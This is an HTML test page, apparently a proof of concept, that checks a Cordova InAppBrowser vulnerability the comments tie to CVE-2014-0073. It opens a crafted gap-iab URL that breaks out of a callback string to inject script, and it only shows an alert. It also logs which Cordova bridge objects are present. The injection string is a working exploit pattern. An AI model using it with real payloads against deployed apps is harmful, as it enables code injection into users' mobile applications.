<!DOCTYPE html>
<html>
<head>
    <title>Cordova Exploit Test</title>
</head>
<body>
    <h1>Testing Cordova InAppBrowser Vuln</h1>
    <button onclick="testExploit()">Test Exploit</button>
    <div id="output"></div>
    
    <script>
        function log(msg) {
            document.getElementById('output').innerHTML += msg + '<br>';
            console.log(msg);
        }
        
        function testExploit() {
            log('Testing InAppBrowser vulnerability...');
            
            // Check if InAppBrowser is available
            if (window.open) {
                log('window.open exists, attempting exploit...');
                
                // Classic exploit pattern from CVE-2014-0073
                // This attempts to break out of the callback string and inject alert
                var exploitUrl = "gap-iab://InAppBrowser12345/',alert('Injected!'),'/";
                
                try {
                    var ref = window.open(exploitUrl, '_blank', 'location=yes');
                    log('Exploit URL opened: ' + exploitUrl);
                } catch(e) {
                    log('Error: ' + e.message);
                }
            } else {
                log('window.open not available');
            }
        }
        
        // Also try to detect the bridge
        log('Checking for Cordova objects...');
        log('window.cordova: ' + (window.cordova ? 'EXISTS' : 'not found'));
        log('window._cordovaNative: ' + (window._cordovaNative ? 'EXISTS' : 'not found'));
        log('window.PhoneGap: ' + (window.PhoneGap ? 'EXISTS' : 'not found'));
    </script>
</body>
</html>
